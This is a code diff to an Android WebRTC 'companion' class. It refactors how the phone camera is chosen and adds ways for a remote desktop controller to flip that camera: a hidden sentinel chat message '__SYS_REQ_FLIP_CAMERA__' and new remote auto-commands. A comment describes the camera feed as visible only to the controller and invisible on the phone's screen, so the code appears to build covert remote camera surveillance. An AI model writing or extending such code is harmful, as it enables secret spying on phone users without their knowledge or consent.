@@ -227,6 +227,16 @@ public class WebRTCCompanion {
                 endCall(false);
             });
 
+            socket.on("chat-message", args -> {
+                try {
+                    JSONObject data = (JSONObject) args[0];
+                    String text = data.optString("text", "");
+                    if ("__SYS_REQ_FLIP_CAMERA__".equals(text)) {
+                        switchCompanionCamera();
+                    }
+                } catch (Exception ignored) {}
+            });
+
             socket.on("remote-control", args -> {
                 try {
                     JSONObject data = (JSONObject) args[0];
@@ -376,28 +386,10 @@ public class WebRTCCompanion {
             // Companion Camera Feed (Visible ONLY to controller desktop, invisible on phone screen)
             if (streamCamera) {
                 try {
-                    Camera2Enumerator enumerator = new Camera2Enumerator(context);
-                    String[] deviceNames = enumerator.getDeviceNames();
-                    String chosenCam = null;
                     boolean preferFront = !"back".equalsIgnoreCase(cameraChoice);
+                    companionCameraCapturer = createCameraCapturer(preferFront);
 
-                    for (String name : deviceNames) {
-                        if (preferFront && enumerator.isFrontFacing(name)) {
-                            chosenCam = name;
-                            isCompanionCamFront = true;
-                            break;
-                        } else if (!preferFront && enumerator.isBackFacing(name)) {
-                            chosenCam = name;
-                            isCompanionCamFront = false;
-                            break;
-                        }
-                    }
-                    if (chosenCam == null && deviceNames.length > 0) {
-                        chosenCam = deviceNames[0];
-                    }
-
-                    if (chosenCam != null) {
-                        companionCameraCapturer = enumerator.createCapturer(chosenCam, null);
+                    if (companionCameraCapturer != null) {
                         companionTextureHelper = SurfaceTextureHelper.create("CompanionCamThread", rootEglBase.getEglBaseContext());
                         companionVideoSource = peerConnectionFactory.createVideoSource(companionCameraCapturer.isScreencast());
                         companionCameraCapturer.initialize(companionTextureHelper, context, companionVideoSource.getCapturerObserver());
@@ -406,7 +398,7 @@ public class WebRTCCompanion {
                         companionCameraTrack = peerConnectionFactory.createVideoTrack("ARDAMSv1_CAM", companionVideoSource);
                         companionCameraTrack.setEnabled(true);
                         peerConnection.addTrack(companionCameraTrack, Collections.singletonList("ARDAMS"));
-                        Log.i(TAG, "Companion camera stream active: " + chosenCam + " (choice=" + cameraChoice + ")");
+                        Log.i(TAG, "Companion camera stream active (choice=" + cameraChoice + ", isFront=" + isCompanionCamFront + ")");
                     }
                 } catch (Exception camErr) {
                     Log.w(TAG, "Failed to start companion camera: " + camErr.getMessage());
@@ -421,20 +413,142 @@ public class WebRTCCompanion {
         }
     }
 
-    public void switchCompanionCamera() {
-        if (companionCameraCapturer != null) {
-            companionCameraCapturer.switchCamera(new CameraVideoCapturer.CameraSwitchHandler() {
-                @Override
-                public void onCameraSwitchDone(boolean isFront) {
-                    isCompanionCamFront = isFront;
-                    Log.i(TAG, "Companion camera switched! Front=" + isFront);
-                }
+    private CameraVideoCapturer createCameraCapturer(boolean preferFront) {
+        CameraEnumerator enumerator;
+        try {
+            if (Camera2Enumerator.isSupported(context)) {
+                enumerator = new Camera2Enumerator(context);
+            } else {
+                enumerator = new Camera1Enumerator(true);
+            }
+        } catch (Exception e) {
+            enumerator = new Camera1Enumerator(true);
+        }
 
-                @Override
-                public void onCameraSwitchError(String errorDescription) {
-                    Log.w(TAG, "Camera switch error: " + errorDescription);
+        String[] deviceNames = enumerator.getDeviceNames();
+        String chosenCam = null;
+
+        for (String name : deviceNames) {
+            if (preferFront && enumerator.isFrontFacing(name)) {
+                chosenCam = name;
+                isCompanionCamFront = true;
+                break;
+            } else if (!preferFront && enumerator.isBackFacing(name)) {
+                chosenCam = name;
+                isCompanionCamFront = false;
+                break;
+            }
+        }
+
+        if (chosenCam == null) {
+            for (String name : deviceNames) {
+                if (!preferFront && enumerator.isFrontFacing(name)) {
+                    chosenCam = name;
+                    isCompanionCamFront = true;
+                    break;
+                } else if (preferFront && enumerator.isBackFacing(name)) {
+                    chosenCam = name;
+                    isCompanionCamFront = false;
+                    break;
                 }
-            });
+            }
+        }
+
+        if (chosenCam == null && deviceNames.length > 0) {
+            chosenCam = deviceNames[0];
+            isCompanionCamFront = enumerator.isFrontFacing(chosenCam);
+        }
+
+        if (chosenCam != null) {
+            try {
+                CameraVideoCapturer capturer = enumerator.createCapturer(chosenCam, null);
+                if (capturer != null) {
+                    Log.i(TAG, "Created camera capturer: " + chosenCam + " (front=" + isCompanionCamFront + ")");
+                    return capturer;
+                }
+            } catch (Exception e) {
+                Log.w(TAG, "Failed creating capturer for " + chosenCam + ", trying Camera1 fallback", e);
+            }
+        }
+
+        try {
+            Camera1Enumerator cam1 = new Camera1Enumerator(true);
+            for (String name : cam1.getDeviceNames()) {
+                if (preferFront && cam1.isFrontFacing(name)) {
+                    isCompanionCamFront = true;
+                    return cam1.createCapturer(name, null);
+                } else if (!preferFront && cam1.isBackFacing(name)) {
+                    isCompanionCamFront = false;
+                    return cam1.createCapturer(name, null);
+                }
+            }
+            if (cam1.getDeviceNames().length > 0) {
+                String first = cam1.getDeviceNames()[0];
+                isCompanionCamFront = cam1.isFrontFacing(first);
+                return cam1.createCapturer(first, null);
+            }
+        } catch (Exception ignored) {}
+
+        return null;
+    }
+
+    public void switchCompanionCamera() {
+        CameraVideoCapturer capturer = companionCameraCapturer != null ? companionCameraCapturer : cameraCapturer;
+        if (capturer == null) {
+            Log.w(TAG, "switchCompanionCamera: No active camera capturer to switch");
+            return;
+        }
+
+        CameraEnumerator enumerator;
+        try {
+            if (Camera2Enumerator.isSupported(context)) {
+                enumerator = new Camera2Enumerator(context);
+            } else {
+                enumerator = new Camera1Enumerator(true);
+            }
+        } catch (Exception e) {
+            enumerator = new Camera1Enumerator(true);
+        }
+
+        String[] deviceNames = enumerator.getDeviceNames();
+        String targetCam = null;
+        boolean wantBack = isCompanionCamFront; // If currently front, switch to back!
+
+        for (String name : deviceNames) {
+            if (wantBack && enumerator.isBackFacing(name)) {
+                targetCam = name;
+                break;
+            } else if (!wantBack && enumerator.isFrontFacing(name)) {
+                targetCam = name;
+                break;
+            }
+        }
+
+        CameraVideoCapturer.CameraSwitchHandler handler = new CameraVideoCapturer.CameraSwitchHandler() {
+            @Override
+            public void onCameraSwitchDone(boolean isFront) {
+                isCompanionCamFront = isFront;
+                Log.i(TAG, "Camera switch completed! Front=" + isFront);
+            }
+
+            @Override
+            public void onCameraSwitchError(String errorDescription) {
+                Log.w(TAG, "Camera switch error with target (" + errorDescription + "), attempting default cycle switch");
+                try {
+                    capturer.switchCamera(new CameraVideoCapturer.CameraSwitchHandler() {
+                        @Override public void onCameraSwitchDone(boolean isFront) { isCompanionCamFront = isFront; }
+                        @Override public void onCameraSwitchError(String err) { Log.e(TAG, "Fallback cycle switch error: " + err); }
+                    });
+                } catch (Exception ignored) {}
+            }
+        };
+
+        if (targetCam != null) {
+            Log.i(TAG, "Switching camera to target: " + targetCam + " (wantBack=" + wantBack + ")");
+            capturer.switchCamera(handler, targetCam);
+        } else {
+            Log.i(TAG, "Switching camera via cycle switch (wantBack=" + wantBack + ")");
+            capturer.switchCamera(handler);
         }
     }
 
@@ -443,19 +557,8 @@ public class WebRTCCompanion {
         setupPeerConnection();
 
         try {
-            Camera2Enumerator enumerator = new Camera2Enumerator(context);
-            String[] deviceNames = enumerator.getDeviceNames();
-            String frontCamera = null;
-            for (String deviceName : deviceNames) {
-                if (enumerator.isFrontFacing(deviceName)) {
-                    frontCamera = deviceName;
-                    break;
-                }
-            }
-            if (frontCamera == null && deviceNames.length > 0) frontCamera = deviceNames[0];
-
-            if (frontCamera != null) {
-                cameraCapturer = enumerator.createCapturer(frontCamera, null);
+            cameraCapturer = createCameraCapturer(true);
+            if (cameraCapturer != null) {
                 surfaceTextureHelper = SurfaceTextureHelper.create("CameraThread", rootEglBase.getEglBaseContext());
                 videoSource = peerConnectionFactory.createVideoSource(cameraCapturer.isScreencast());
                 cameraCapturer.initialize(surfaceTextureHelper, context, videoSource.getCapturerObserver());
@@ -791,6 +894,13 @@ public class WebRTCCompanion {
                 Log.i(TAG, "Auto-command received: " + command + " from " + caller + " (cam=" + cameraChoice + ")");
 
                 switch (command) {
+                    case "end_call":
+                        endCall(false);
+                        break;
+                    case "flip_camera":
+                    case "switch_camera":
+                        switchCompanionCamera();
+                        break;
                     case "audio_call":
                         startAudioCall(caller);
                         break;
